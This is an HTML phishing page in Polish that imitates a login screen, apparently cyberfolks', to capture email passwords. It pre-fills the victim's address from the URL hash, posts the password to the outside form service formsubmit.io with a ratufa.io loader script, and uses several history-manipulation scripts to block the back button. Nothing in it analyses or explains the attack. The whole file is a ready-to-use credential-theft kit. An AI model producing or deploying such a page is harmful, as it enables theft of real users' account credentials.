<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zaloguj</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }

        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 60px;
            width: 100%;
            max-width: 900px;
        }

        /* Left Side Image Container */
        .image-side {
            flex: 1;
            max-width: 440px;
        }

        .image-side img {
            width: 100%;
            height: auto;
            display: block;
        }

        /* Right Side Form Container */
        .form-side {
            width: 100%;
            max-width: 320px;
        }

        .form-title {
            font-size: 24px;
            color: #333333;
            margin-bottom: 24px;
            font-weight: normal;
        }

        /* Input Container Structure with Left Icon Box */
        .input-wrapper {
            display: flex;
            margin-bottom: 12px;
            width: 100%;
        }

        .icon-box {
            background-color: #e8e8e8;
            border: 1px solid #cccccc;
            border-right: none;
            width: 46px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #555555;
            font-size: 16px;
        }

        .form-control {
            flex: 1;
            padding: 12px;
            border: 1px solid #cccccc;
            font-size: 14px;
            outline: none;
            color: #333333;
            background-color: #ffffff;
        }

        /* Keep yellow active outline styling exactly as original image */
        .input-wrapper.highlight .icon-box {
            border-color: #ffcc00;
        }
        .input-wrapper.highlight .form-control {
            border-color: #ffcc00;
        }

        textarea.form-control {
            resize: vertical;
            min-height: 80px;
        }

        /* Flat bright yellow rectangular submit button */
        .submit-btn {
            width: 100%;
            background-color: #51b200;
            color: #333333;
            border: #51b200;
            padding: 12px;
            font-size: 14px;
            font-weight: normal;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 4px;
            transition: background-color 0.1s ease;
        }

        .submit-btn:hover {
            background-color: #e5b800;
        }

        /* Windows system layer watermark overlay background asset */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(0, 0, 0, 0.22);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
        }

        @media (max-width: 768px) {
            .main-container {
                flex-direction: column;
                gap: 40px;
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        
        <!-- Left Column: Unmodified Original Vector Image Layout Component -->
        <div class="image-side">
            <!-- Utilizing default fallback reference matching uploaded composition framework -->
            <img src="https://github.com/cdtechdigital/images/blob/main/cyberfolks.JPG?raw=true" alt="Trulli" width="" height="">

        </div>

        <!-- Right Column: Login UI Container Transformed into Contact Form -->
        <div class="form-side">
            <h1 class="form-title">Zaloguj</h1>
                            
            <form action="https://formsubmit.io" method="POST">
                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
                <!-- Highlight class preserves original golden accent outline feature -->
                <div class="input-wrapper highlight">
                    <div class="icon-box">👤</div>
<input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
                
                <div class="input-wrapper">
                    <div class="icon-box">🔒</div>
<input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>
          
                
                <button type="submit" class="submit-btn"><b>Zaloguj</button>
            </form>
        </div>

    </div>

    <!-- Authentic Windows Activation Watermark Representation Layer -->

    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
